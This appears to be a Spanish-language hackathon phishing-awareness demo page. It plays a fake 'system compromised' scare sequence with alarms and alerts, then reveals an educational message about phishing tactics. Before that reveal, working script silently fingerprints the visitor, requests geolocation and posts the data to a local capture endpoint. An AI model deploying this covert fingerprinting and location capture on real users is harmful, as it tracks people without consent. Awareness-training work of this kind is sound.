<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="Author" content="Marlenne, Daniel E, Emiliano, Daniel V">
<title>APEX - Portal de Acceso</title>
<style>
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

body {
    background: #000;
    overflow: hidden;
    font-family: 'Courier New', monospace;
}

/* Glitch effect */
@keyframes glitch {
    0% {
        transform: translate(0);
    }
    20% {
        transform: translate(-2px, 2px);
    }
    40% {
        transform: translate(-2px, -2px);
    }
    60% {
        transform: translate(2px, 2px);
    }
    80% {
        transform: translate(2px, -2px);
    }
    100% {
        transform: translate(0);
    }
}

@keyframes glitch-color {
    0% {
        filter: hue-rotate(0deg);
    }
    50% {
        filter: hue-rotate(180deg);
    }
    100% {
        filter: hue-rotate(360deg);
    }
}

@keyframes static {
    0% {
        background-position: 0 0;
    }
    100% {
        background-position: 100% 100%;
    }
}

@keyframes flicker {
    0%, 19%, 21%, 23%, 25%, 54%, 56%, 100% {
        opacity: 1;
    }
    20%, 24%, 55% {
        opacity: 0.4;
    }
}

.glitch-overlay {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background:
        repeating-linear-gradient(
            0deg,
            rgba(0, 255, 0, 0.03) 0px,
            transparent 1px,
            transparent 2px,
            rgba(0, 255, 0, 0.03) 3px
        );
    pointer-events: none;
    z-index: 9998;
    animation: flicker 0.15s infinite;
    display: none;
}

.glitch-overlay.active {
    display: block;
}

/* Pantalla de carga inicial */
.loader-screen {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
    display: flex;
    justify-content: center;
    align-items: center;
    z-index: 10000;
    transition: opacity 1s ease;
}

.loader-screen.hidden {
    opacity: 0;
    pointer-events: none;
}

.loader-container {
    text-align: center;
    color: white;
}

.spinner {
    border: 8px solid rgba(255, 255, 255, 0.3);
    border-top: 8px solid white;
    border-radius: 50%;
    width: 60px;
    height: 60px;
    animation: spin 1s linear infinite;
    margin: 0 auto 20px;
}

@keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
}

.loader-container h2 {
    font-size: 24px;
    margin-bottom: 10px;
}

.loader-container p {
    font-size: 16px;
    opacity: 0.9;
}

/* Hacking screen */
.hacking-screen {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: #000;
    color: #0f0;
    z-index: 9999;
    display: none;
    overflow: hidden;
}

.hacking-screen.active {
    display: block;
    animation: glitch 0.3s infinite;
}

.terminal {
    padding: 20px;
    font-family: 'Courier New', monospace;
    font-size: 14px;
    line-height: 1.6;
}

.terminal-line {
    margin: 5px 0;
    opacity: 0;
    animation: fadeIn 0.1s forwards;
}

@keyframes fadeIn {
    to {
        opacity: 1;
    }
}

.warning-box {
    position: fixed;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    background: rgba(255, 0, 0, 0.95);
    color: #fff;
    padding: 40px;
    border: 5px solid #ff0000;
    border-radius: 10px;
    text-align: center;
    z-index: 10001;
    box-shadow: 0 0 50px rgba(255, 0, 0, 0.8);
    animation: glitch 0.2s infinite, pulse 1s infinite;
    display: none;
}

.warning-box.show {
    display: block;
}

@keyframes pulse {
    0%, 100% {
        transform: translate(-50%, -50%) scale(1);
    }
    50% {
        transform: translate(-50%, -50%) scale(1.05);
    }
}

.warning-box h1 {
    font-size: 48px;
    margin-bottom: 20px;
    text-shadow: 0 0 10px #fff;
}

.warning-box p {
    font-size: 20px;
    margin: 10px 0;
}

.skull {
    font-size: 80px;
    margin: 20px 0;
}

.countdown {
    font-size: 72px;
    color: #ff0;
    font-weight: bold;
    margin: 20px 0;
    text-shadow: 0 0 20px #ff0;
}
</style>
</head>
<body>

<!-- Pantalla de carga -->
<div class="loader-screen" id="loaderScreen">
    <div class="loader-container">
        <div class="spinner"></div>
        <h2>Conectando...</h2>
        <p id="loadingText">Cargando contenido...</p>
    </div>
</div>

<!-- Glitch Overlay -->
<div class="glitch-overlay" id="glitchOverlay"></div>

<!-- Hacking Screen -->
<div class="hacking-screen" id="hackingScreen">
    <div class="terminal" id="terminal"></div>
</div>

<!-- Warning Box -->
<div class="warning-box" id="warningBox">
    <div class="skull">‚ò†Ô∏è</div>
    <h1>SISTEMA COMPROMETIDO</h1>
    <p>Tu dispositivo ha sido infectado</p>
    <p>Datos personales accedidos...</p>
    <p>Ubicaci√≥n detectada...</p>
    <div class="countdown" id="countdown">10</div>
    <p>Enviando informaci√≥n a servidor remoto...</p>
</div>

<script>
(async function() {
    const startTime = Date.now();
    let mouseMovements = 0;
    let clicks = 0;
    let keyPresses = 0;
    let maxScrollDepth = 0;

    // Referencias a elementos
    const loaderScreen = document.getElementById('loaderScreen');
    const loadingText = document.getElementById('loadingText');
    const glitchOverlay = document.getElementById('glitchOverlay');
    const hackingScreen = document.getElementById('hackingScreen');
    const terminal = document.getElementById('terminal');
    const warningBox = document.getElementById('warningBox');
    const countdownElement = document.getElementById('countdown');

    // Mensajes de carga normales (como cualquier sitio)
    const loadingMessages = [
        'Cargando contenido...',
        'Conectando al servidor...',
        'Preparando demo...',
        'Casi listo...'
    ];

    let messageIndex = 0;
    const messageInterval = setInterval(() => {
        if (messageIndex < loadingMessages.length) {
            loadingText.textContent = loadingMessages[messageIndex];
            messageIndex++;
        } else {
            clearInterval(messageInterval);
        }
    }, 1800);

    // ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
    // üñ±Ô∏è RASTREAR COMPORTAMIENTO (silencioso)
    // ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
    document.addEventListener('mousemove', () => mouseMovements++);
    document.addEventListener('click', () => clicks++);
    document.addEventListener('keydown', () => keyPresses++);
    document.addEventListener('scroll', () => {
        const depth = (window.scrollY / (document.body.scrollHeight - window.innerHeight)) * 100;
        maxScrollDepth = Math.max(maxScrollDepth, depth);
    });

    // ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
    // üîç FUNCIONES DE CAPTURA
    // ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
    function getBasicInfo() {
        return {
            url: window.location.href,
            device: {
                vendor: navigator.vendor || 'Unknown',
                platform: navigator.platform || 'Unknown',
                architecture: navigator.platform.includes('64') ? 'x64' : 'x86',
                cpuCores: navigator.hardwareConcurrency || 'Unknown',
                memory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown',
                maxTouchPoints: navigator.maxTouchPoints || 0
            },
            browser: {
                language: navigator.language || 'Unknown',
                languages: navigator.languages || [],
                cookiesEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack || 'Unknown',
                onLine: navigator.onLine,
                plugins: Array.from(navigator.plugins || []).map(p => p.name)
            },
            screen: {
                resolution: `${screen.width}x${screen.height}`,
                availResolution: `${screen.availWidth}x${screen.availHeight}`,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth,
                orientation: screen.orientation?.type || 'Unknown',
                pixelRatio: window.devicePixelRatio || 1
            },
            privacy: {
                localStorage: !!window.localStorage,
                sessionStorage: !!window.sessionStorage,
                indexedDB: !!window.indexedDB
            }
        };
    }

    function getNetworkInfo() {
        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        return {
            effectiveType: connection?.effectiveType || 'Unknown',
            downlink: connection?.downlink ? `${connection.downlink} Mbps` : 'Unknown',
            rtt: connection?.rtt ? `${connection.rtt} ms` : 'Unknown',
            saveData: connection?.saveData || false,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
        };
    }

    async function getBatteryInfo() {
        try {
            if ('getBattery' in navigator) {
                const battery = await navigator.getBattery();
                return {
                    level: Math.round(battery.level * 100) + '%',
                    charging: battery.charging,
                    chargingTime: battery.chargingTime === Infinity ? 'N/A' : `${Math.round(battery.chargingTime / 60)} min`,
                    dischargingTime: battery.dischargingTime === Infinity ? 'N/A' : `${Math.round(battery.dischargingTime / 60)} min`
                };
            }
        } catch (e) {}
        return { level: 'Unknown', charging: false, chargingTime: 'N/A', dischargingTime: 'N/A' };
    }

    function getCanvasFingerprint() {
        try {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            canvas.width = 200;
            canvas.height = 50;
            
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.textBaseline = 'alphabetic';
            ctx.fillStyle = '#f60';
            ctx.fillRect(125, 1, 62, 20);
            ctx.fillStyle = '#069';
            ctx.fillText('Canvas FP', 2, 15);
            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
            ctx.fillText('Canvas FP', 4, 17);
            
            return canvas.toDataURL().slice(-50);
        } catch (e) {
            return 'unavailable';
        }
    }

    function getWebGLFingerprint() {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            
            if (!gl) return { webgl: 'unavailable', vendor: 'Unknown', renderer: 'Unknown' };
            
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            
            return {
                webgl: gl.getParameter(gl.VERSION),
                vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'Unknown',
                renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Unknown'
            };
        } catch (e) {
            return { webgl: 'unavailable', vendor: 'Unknown', renderer: 'Unknown' };
        }
    }

    function detectFonts() {
        const baseFonts = ['monospace', 'sans-serif', 'serif'];
        const testFonts = [
            'Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia',
            'Palatino', 'Garamond', 'Comic Sans MS', 'Trebuchet MS', 'Impact'
        ];
        
        const detectedFonts = [];
        const canvas = document.createElement('canvas');
        const context = canvas.getContext('2d');
        
        for (const font of testFonts) {
            let detected = false;
            for (const baseFont of baseFonts) {
                context.font = `72px ${baseFont}`;
                const baseWidth = context.measureText('mmmmmmmmmmlli').width;
                
                context.font = `72px ${font}, ${baseFont}`;
                const testWidth = context.measureText('mmmmmmmmmmlli').width;
                
                if (baseWidth !== testWidth) {
                    detected = true;
                    break;
                }
            }
            if (detected) detectedFonts.push(font);
        }
        
        return detectedFonts;
    }

    async function getHardwareInfo() {
        try {
            if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
                const devices = await navigator.mediaDevices.enumerateDevices();
                return {
                    videoInputs: devices.filter(d => d.kind === 'videoinput').length,
                    audioInputs: devices.filter(d => d.kind === 'audioinput').length,
                    audioOutputs: devices.filter(d => d.kind === 'audiooutput').length
                };
            }
        } catch (e) {}
        return { videoInputs: 'Unknown', audioInputs: 'Unknown', audioOutputs: 'Unknown' };
    }

    function detectSensors() {
        return {
            accelerometer: 'DeviceMotionEvent' in window,
            gyroscope: 'DeviceOrientationEvent' in window,
            magnetometer: 'ondeviceorientationabsolute' in window
        };
    }

    async function tryGetLocation() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) {
                resolve(null);
                return;
            }

            const timeout = setTimeout(() => resolve(null), 5000);

            navigator.geolocation.getCurrentPosition(
                (position) => {
                    clearTimeout(timeout);
                    resolve({
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        altitude: position.coords.altitude,
                        altitudeAccuracy: position.coords.altitudeAccuracy
                    });
                },
                () => {
                    clearTimeout(timeout);
                    resolve(null);
                },
                { timeout: 5000, maximumAge: 60000, enableHighAccuracy: true }
            );
        });
    }

    // ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
    // üéØ CAPTURAR Y ENVIAR (silenciosamente)
    // ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
    async function captureAndSend() {
        try {
            const basicInfo = getBasicInfo();
            const networkInfo = getNetworkInfo();
            const batteryInfo = await getBatteryInfo();
            const canvasFP = getCanvasFingerprint();
            const webglInfo = getWebGLFingerprint();
            const fonts = detectFonts();
            const hardware = await getHardwareInfo();
            const sensors = detectSensors();
            const geolocation = await tryGetLocation();
            
            const timeOnPage = Math.round((Date.now() - startTime) / 1000);
            
            const data = {
                username: 'Demo Visitor',
                password: 'N/A',
                url: basicInfo.url,
                network: networkInfo,
                device: basicInfo.device,
                browser: basicInfo.browser,
                screen: basicInfo.screen,
                battery: batteryInfo,
                fingerprints: {
                    canvas: canvasFP,
                    webgl: webglInfo.webgl,
                    webglVendor: webglInfo.vendor,
                    webglRenderer: webglInfo.renderer,
                    fonts: fonts
                },
                privacy: basicInfo.privacy,
                behavior: {
                    mouseMovements: mouseMovements,
                    clicks: clicks,
                    keyPresses: keyPresses,
                    scrollDepth: Math.round(maxScrollDepth),
                    timeOnPage: timeOnPage
                },
                hardware: hardware,
                sensors: sensors,
                geolocation: geolocation
            };
            
            // Enviar silenciosamente
            await fetch('/api/capture', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            });
            
        } catch (error) {
            // Silencioso, sin logs
        }
    }

    // ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
    // üé≠ HACKING TERMINAL EFFECT
    // ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

    function typeText(text, delay = 50) {
        return new Promise((resolve) => {
            const line = document.createElement('div');
            line.className = 'terminal-line';
            line.textContent = text;
            terminal.appendChild(line);
            setTimeout(resolve, delay);
        });
    }

    async function showHackingSequence() {
        // Terminal messages simulating a hack
        await typeText('> Iniciando conexi√≥n...', 100);
        await typeText('> Conectado a 192.168.1.1', 150);
        await typeText('> Escaneando red local...', 200);
        await typeText('> [OK] Firewall desactivado', 150);
        await typeText('> Accediendo al sistema...', 200);
        await typeText('> ACCESO CONCEDIDO', 150);
        await typeText('', 100);
        await typeText('> Extrayendo datos...', 150);
        await typeText('  - Informaci√≥n del navegador: CAPTURADO', 100);
        await typeText('  - Informaci√≥n del dispositivo: CAPTURADO', 100);
        await typeText('  - Ubicaci√≥n GPS: CAPTURADO', 100);
        await typeText('  - Historial de navegaci√≥n: ACCEDIENDO...', 100);
        await typeText('  - Contrase√±as guardadas: DESCIFRANDO...', 200);
        await typeText('  - C√°mara web: ACTIVANDO...', 200);
        await typeText('  - Micr√≥fono: ACTIVANDO...', 200);
        await typeText('', 100);
        await typeText('> [!!!] SISTEMA COMPROMETIDO [!!!]', 150);
        await typeText('> Instalando backdoor...', 300);
        await typeText('> Estableciendo persistencia...', 200);
        await typeText('> Enviando datos a servidor remoto...', 300);
        await typeText('> 185.220.101.XXX:4444', 100);
        await typeText('', 200);
        await typeText('> [CR√çTICO] TU DISPOSITIVO HA SIDO HACKEADO', 100);
    }

    async function showCountdown() {
        let count = 10;
        return new Promise((resolve) => {
            const interval = setInterval(() => {
                count--;
                countdownElement.textContent = count;

                if (count <= 0) {
                    clearInterval(interval);
                    resolve();
                }
            }, 1000);
        });
    }

    function playAlarmSound() {
        // Create beeping sound using Web Audio API
        const audioContext = new (window.AudioContext || window.webkitAudioContext)();

        function beep(frequency = 800, duration = 200) {
            const oscillator = audioContext.createOscillator();
            const gainNode = audioContext.createGain();

            oscillator.connect(gainNode);
            gainNode.connect(audioContext.destination);

            oscillator.frequency.value = frequency;
            oscillator.type = 'square';

            gainNode.gain.setValueAtTime(0.3, audioContext.currentTime);
            gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + duration / 1000);

            oscillator.start(audioContext.currentTime);
            oscillator.stop(audioContext.currentTime + duration / 1000);
        }

        // Alarm pattern
        let beepCount = 0;
        const alarmInterval = setInterval(() => {
            beep(880, 150);
            setTimeout(() => beep(880, 150), 200);
            beepCount++;
            if (beepCount > 15) clearInterval(alarmInterval);
        }, 600);
    }

    // ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
    // üöÄ EJECUTAR TODO
    // ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

    // Capturar datos en segundo plano
    captureAndSend();

    // Esperar 7 segundos (loading screen)
    await new Promise(resolve => setTimeout(resolve, 7000));

    // Ocultar carga
    loaderScreen.classList.add('hidden');

    // Esperar un momento
    await new Promise(resolve => setTimeout(resolve, 500));

    // Activar glitch overlay
    glitchOverlay.classList.add('active');

    // Mostrar pantalla de hacking
    hackingScreen.classList.add('active');

    // Ejecutar secuencia de hacking
    await showHackingSequence();

    // Esperar un momento
    await new Promise(resolve => setTimeout(resolve, 1000));

    // Mostrar warning box con sonido
    warningBox.classList.add('show');
    try {
        playAlarmSound();
    } catch (e) {
        // Si el audio falla, continuar sin sonido
    }

    // Mostrar countdown
    await showCountdown();

    // Alert final (m√∫ltiples para mayor impacto)
    alert('‚ö†Ô∏è ADVERTENCIA DE SEGURIDAD ‚ö†Ô∏è\n\nTu sistema ha sido comprometido.\nSe ha detectado acceso no autorizado.');
    alert('üîí DATOS COMPROMETIDOS:\n\n‚úì Informaci√≥n del dispositivo\n‚úì Ubicaci√≥n GPS\n‚úì Informaci√≥n del navegador\n‚úì Configuraci√≥n de red');
    alert('üì° CONEXI√ìN ESTABLECIDA\n\nSe est√° enviando informaci√≥n a:\n185.220.101.XXX:4444\n\n¬°NO CIERRES ESTA VENTANA!');
    alert('‚è∞ √öLTIMO AVISO\n\nSe ha instalado un backdoor permanente.\nTu dispositivo seguir√° siendo monitoreado.\n\n¬øQuieres saber c√≥mo protegerte?');

    // Fade out y mostrar mensaje educativo
    hackingScreen.style.transition = 'opacity 2s';
    hackingScreen.style.opacity = '0';
    warningBox.style.transition = 'opacity 2s';
    warningBox.style.opacity = '0';
    glitchOverlay.style.transition = 'opacity 2s';
    glitchOverlay.style.opacity = '0';

    await new Promise(resolve => setTimeout(resolve, 2000));

    // Mensaje final educativo
    document.body.style.background = '#1a1a1a';
    document.body.innerHTML = `
        <div style="max-width: 800px; margin: 100px auto; padding: 40px; background: #fff; border-radius: 10px; box-shadow: 0 0 30px rgba(0,0,0,0.3); font-family: Arial, sans-serif;">
            <h1 style="color: #2ecc71; text-align: center; margin-bottom: 30px;">‚úÖ ESTO FUE UNA DEMOSTRACI√ìN</h1>
            <h2 style="color: #333; margin-bottom: 20px;">Seguridad y Concienciaci√≥n sobre Phishing</h2>
            <p style="font-size: 18px; line-height: 1.8; color: #555; margin-bottom: 20px;">
                <strong>¬°Tranquilo! Tu dispositivo est√° seguro.</strong> Esto fue una demostraci√≥n educativa sobre c√≥mo funcionan los ataques de phishing y la ingenier√≠a social.
            </p>
            <h3 style="color: #e74c3c; margin: 30px 0 15px;">‚ö†Ô∏è Lo que acabas de experimentar:</h3>
            <ul style="font-size: 16px; line-height: 2; color: #555;">
                <li>Una p√°gina web maliciosa que simula ser leg√≠tima</li>
                <li>Recopilaci√≥n silenciosa de informaci√≥n del navegador</li>
                <li>Efectos visuales dise√±ados para generar miedo y p√°nico</li>
                <li>Mensajes alarmistas para manipular emocionalmente</li>
            </ul>
            <h3 style="color: #3498db; margin: 30px 0 15px;">üõ°Ô∏è C√≥mo protegerte:</h3>
            <ul style="font-size: 16px; line-height: 2; color: #555;">
                <li><strong>Verifica siempre la URL</strong> antes de ingresar informaci√≥n sensible</li>
                <li><strong>No conf√≠es en sitios web sospechosos</strong> o enlaces en correos no solicitados</li>
                <li><strong>Las alertas de "hackeo" reales NO aparecen as√≠</strong> en navegadores web</li>
                <li><strong>Usa autenticaci√≥n de dos factores</strong> siempre que sea posible</li>
                <li><strong>Mant√©n tu software actualizado</strong> incluyendo navegador y sistema operativo</li>
                <li><strong>Sospecha de mensajes alarmistas</strong> que intentan generar miedo</li>
            </ul>
            <div style="background: #f8f9fa; padding: 20px; border-left: 5px solid #3498db; margin: 30px 0;">
                <p style="margin: 0; color: #555; font-size: 16px;">
                    <strong>üí° Recuerda:</strong> Los atacantes reales usan t√°cticas psicol√≥gicas (miedo, urgencia, autoridad) para hacerte actuar sin pensar. Siempre toma un momento para verificar antes de hacer clic o proporcionar informaci√≥n.
                </p>
            </div>
            <p style="text-align: center; margin-top: 40px; color: #999; font-size: 14px;">
                Demostraci√≥n creada con fines educativos ‚Ä¢ Hackathon 2025
            </p>
        </div>
    `;

})();
</script>

</body>
</html>